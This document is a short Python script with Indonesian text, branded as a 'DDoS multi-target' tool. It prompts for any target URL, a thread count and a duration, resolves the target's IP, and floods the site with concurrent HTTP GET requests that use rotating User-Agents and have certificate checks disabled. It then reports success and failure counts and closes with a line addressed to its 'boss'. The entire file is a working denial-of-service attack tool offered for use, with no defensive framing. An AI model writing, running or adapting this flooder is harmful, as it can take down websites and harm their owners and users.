import time, threading, random, socket
import requests

print("\n" + "="*50)
print("   LUMMXDPROJECT · DDoS MULTI-TARGET")
print("="*50)

url = input("Masukkan target URL (contoh: https://shop-lummxd.vercel.app) : ")
threads = int(input("Jumlah thread (contoh: 100) : ") or 50)
durasi = int(input("Durasi dalam detik (contoh: 30) : ") or 30)

# Resolve domain ke IP
try:
    domain = url.split("//")[1].split("/")[0].split(":")[0]
    ip = socket.gethostbyname(domain)
    print(f"\n[+] Domain  : {domain}")
    print(f"[+] IP      : {ip}")
except:
    ip = "Tidak bisa resolve"
    print(f"\n[!] Gagal resolve domain, tetap pakai URL.")

total = 0
gagal = 0
berhasil = 0
running = True

def serang():
    global total, gagal, berhasil
    s = requests.Session()
    s.verify = False
    while running:
        try:
            time.sleep(random.uniform(0.01, 0.15))
            h = {'User-Agent': random.choice(['Mozilla/5.0', 'Chrome/91', 'Firefox/88'])}
            r = s.get(url, headers=h, timeout=3)
            total += 1
            if r.status_code < 400:
                berhasil += 1
            else:
                gagal += 1
        except:
            total += 1
            gagal += 1

print(f"\n[+] Menyerang {url} (IP: {ip}) dengan {threads} thread selama {durasi} detik...\n")

for _ in range(threads):
    t = threading.Thread(target=serang)
    t.daemon = True
    t.start()

mulai = time.time()
while running:
    time.sleep(1)
    if time.time() - mulai > durasi:
        running = False
        break
    elapsed = int(time.time() - mulai)
    print(f"\r⏱ {elapsed}s | ✓ {berhasil} | ✗ {gagal} | ∑ {total}", end="")

print("\n\n=== LAPORAN AKHIR ===")
print(f"Target   : {url}")
print(f"IP       : {ip}")
print(f"Total    : {total}")
print(f"Berhasil : {berhasil}")
print(f"Gagal    : {gagal}")
print("========================")
print("LummXDProject siap perintah selanjutnya, bos-tuan besar!")
